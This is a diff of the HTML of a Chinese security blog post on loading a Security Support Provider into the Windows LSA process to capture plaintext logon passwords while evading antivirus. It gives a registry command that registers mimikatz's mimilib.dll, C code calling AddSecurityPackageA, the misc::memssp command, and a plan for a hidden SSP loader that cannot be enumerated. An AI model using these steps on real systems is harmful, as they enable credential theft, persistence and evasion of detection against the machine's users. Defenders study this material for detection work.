@@ -210,13 +210,13 @@
       
         <p>基于SSP绕过一些杀软dump lsa内存</p>
 <span id="more"></span>
-
 <p>相关文章：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">https://blog.xpnsec.com/exploring-mimikatz-part-2/</a>  （原文）</p>
-<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8">https://3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8</a>  （中文解读）</p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8">https://3gstudent.github.io/Mimikatz中SSP的使用</a>  （中文解读）</p>
 <p>mimikatz也实现了一个ssp的dll叫mimilib.dll</p>
 <p>有以下几种方法可以将ssp加载到lsa进程当中</p>
-<h1 id="SSPI-x2F-SSP"><a href="#SSPI-x2F-SSP" class="headerlink" title="SSPI&#x2F;SSP"></a>SSPI&#x2F;SSP</h1><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/t018ada8ed1499cad3a.gif" alt="img"></p>
+<h1>SSPI/SSP</h1>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/t018ada8ed1499cad3a.gif" alt="img"></p>
 <ul>
 <li>SSPI(Security Support Provider Interface)</li>
 </ul>
@@ -224,7 +224,7 @@
 <ul>
 <li>SSP(Security Support Provider)</li>
 </ul>
-<p> SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p>
+<p>SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p>
 <ol>
 <li>NTLM SSP</li>
 <li>Kerberos</li>
@@ -235,12 +235,12 @@
 <li>Negotiate Extensions SSP</li>
 <li>PKU2U SSP</li>
 </ol>
-<p>在系统层面，SSP就是一个dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge&#x2F;Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p>
-<h1 id="Mimilib"><a href="#Mimilib" class="headerlink" title="Mimilib"></a>Mimilib</h1><p>mimilib集成了很多功能，实现ssp接口只是其中一个功能</p>
+<p>在系统层面，SSP就是一个dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p>
+<h1>Mimilib</h1>
+<p>mimilib集成了很多功能，实现ssp接口只是其中一个功能</p>
 <p>实现从lsass进程中提取凭据的导出函数为<code>SpLsaModeInitialize</code></p>
 <p>想要提取出这个功能，可以删除其他导出函数，修改后的mimilib.def内容如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY</span><br><span class="line">EXPORTS</span><br><span class="line">SpLsaModeInitialize		=	kssp_SpLsaModeInitialize</span><br></pre></td></tr></table></figure>
-
 <p>mimilib从lsass进程中提取明文凭据的实现代码：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kssp.c">https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kssp.c</a></p>
 <p>实现代码中包括以下四个函数：</p>
@@ -250,19 +250,20 @@
 <li>SpGetInfo 提供有关SSP的信息，包括版本，名称和说明 在枚举SSP(方法在后面会介绍)时会显示这些信息</li>
 <li>SpAcceptCredentials 接收LSA传递的明文凭证，由SSP缓存 mimilib在这里实现了将明文凭证保存在文件<code>c:\windows\system32\kiwissp.log</code>中</li>
 </ol>
-<h2 id="注册表中添加SSP"><a href="#注册表中添加SSP" class="headerlink" title="注册表中添加SSP"></a>注册表中添加SSP</h2><p>相关官方指导文档：</p>
+<h2 id="注册表中添加SSP"><a class="header-anchor" href="#注册表中添加SSP">¶</a>注册表中添加SSP</h2>
+<p>相关官方指导文档：</p>
 <p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/secauthn/restrictions-around-registering-and-installing-a-security-package">https://learn.microsoft.com/en-us/windows/win32/secauthn/restrictions-around-registering-and-installing-a-security-package</a></p>
 <p>(1)需要复制文件</p>
-<p>将想注册的sspdll复制到<code>c:\windows\system32</code>下即（%systemroot%&#x2F;system32）</p>
+<p>将想注册的sspdll复制到<code>c:\windows\system32</code>下即（%systemroot%/system32）</p>
 <p>64位系统要用64位的mimilib.dll，32位系统使用32位的mimilib.dll</p>
 <p>(2)修改注册表</p>
 <p>位置<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages</code>的值设置为mimilib.dll</p>
 <p>注册表键值类型为REG_MULTI_SZ需要在每项之间加上’\0’</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#修改注册表项</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class="line"></span><br><span class="line">#查看注册表项是否注入恶意dll</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span><br></pre></td></tr></table></figure>
-
 <p>(3)等待系统重新启动</p>
 <p>系统重新启动后，在<code>c:\windows\system32</code>生成文件<code>kiwissp.log</code>，记录当前用户的明文口令</p>
-<h2 id="使用API-AddSecurityPackage"><a href="#使用API-AddSecurityPackage" class="headerlink" title="使用API AddSecurityPackage"></a>使用API AddSecurityPackage</h2><p>相比于修改注册表，好处就是不需要重启</p>
+<h2 id="使用API-AddSecurityPackage"><a class="header-anchor" href="#使用API-AddSecurityPackage">¶</a>使用API AddSecurityPackage</h2>
+<p>相比于修改注册表，好处就是不需要重启</p>
 <p>(1)复制文件</p>
 <p>同方法1</p>
 <p>(2)修改注册表</p>
@@ -270,17 +271,18 @@
 <p>(3)调用AddSecurityPackage</p>
 <p>测试代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#define SECURITY_WIN32</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;Security.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;Secur32.lib&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	SECURITY_PACKAGE_OPTIONS option;</span><br><span class="line">	option.Size = sizeof(option);</span><br><span class="line">	option.Flags = 0;</span><br><span class="line">	option.Type = SECPKG_OPTIONS_TYPE_LSA;</span><br><span class="line">	option.SignatureSize = 0;</span><br><span class="line">	option.Signature = NULL;</span><br><span class="line">	SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA(&quot;mimilib&quot;, &amp;option);</span><br><span class="line">	printf(&quot;AddSecurityPackage return with 0x%X\n&quot;, SEC_ENTRYnRet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>添加成功，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会生成文件<code>kiwissp.log</code></p>
 <p>方法2的自动化实现：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1">https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1</a></p>
-<h1 id="Memssp"><a href="#Memssp" class="headerlink" title="Memssp"></a>Memssp</h1><h2 id="内存中直接加载"><a href="#内存中直接加载" class="headerlink" title="内存中直接加载"></a>内存中直接加载</h2><p>这是mimikatz中的功能，命令如下：</p>
+<h1>Memssp</h1>
+<h2 id="内存中直接加载"><a class="header-anchor" href="#内存中直接加载">¶</a>内存中直接加载</h2>
+<p>这是mimikatz中的功能，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
-
 <p>通过修改lsass进程的内存，实现从lsass进程中提取凭据</p>
 <p>命令执行后，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会在<code>c:\windows\system32</code>下生成文件<code>mimilsa.log</code></p>
 <p>根据XPN的分析，大概原理就是打开lsa进程后查找msv1_0.dll的句柄，然后hook其函数msv1_0.dll—SpAcceptCredentials</p>
-<h1 id="bypass方法"><a href="#bypass方法" class="headerlink" title="bypass方法"></a>bypass方法</h1><p>上面几种方法都有利有弊</p>
+<h1>bypass方法</h1>
+<p>上面几种方法都有利有弊</p>
 <p>mimilib.dll无论是注册表加载，还是通过api的方式加载，最后都可以通过函数 <code>EnumerateSecurityPackages</code>看到其记录</p>
 <p>memssp是基于hook的方式进行的，需要修改lsa进程内存，使用了WriteProcessMemory函数，有被检测到的风险</p>
 <p>那么bypass的思路就是结合以上两种方式，自制一个加载器来加载SSP，并且使得无法枚举出我们加载的SSP</p>
@@ -383,7 +385,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSPI-x2F-SSP"><span class="nav-number">1.</span> <span class="nav-text">SSPI&#x2F;SSP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mimilib"><span class="nav-number">2.</span> <span class="nav-text">Mimilib</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0SSP"><span class="nav-number">2.1.</span> <span class="nav-text">注册表中添加SSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8API-AddSecurityPackage"><span class="nav-number">2.2.</span> <span class="nav-text">使用API AddSecurityPackage</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Memssp"><span class="nav-number">3.</span> <span class="nav-text">Memssp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E4%B8%AD%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD"><span class="nav-number">3.1.</span> <span class="nav-text">内存中直接加载</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">bypass方法</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">SSPI&#x2F;SSP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">Mimilib</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0SSP"><span class="nav-number">2.1.</span> <span class="nav-text">注册表中添加SSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8API-AddSecurityPackage"><span class="nav-number">2.2.</span> <span class="nav-text">使用API AddSecurityPackage</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">Memssp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E4%B8%AD%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD"><span class="nav-number">3.1.</span> <span class="nav-text">内存中直接加载</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">bypass方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
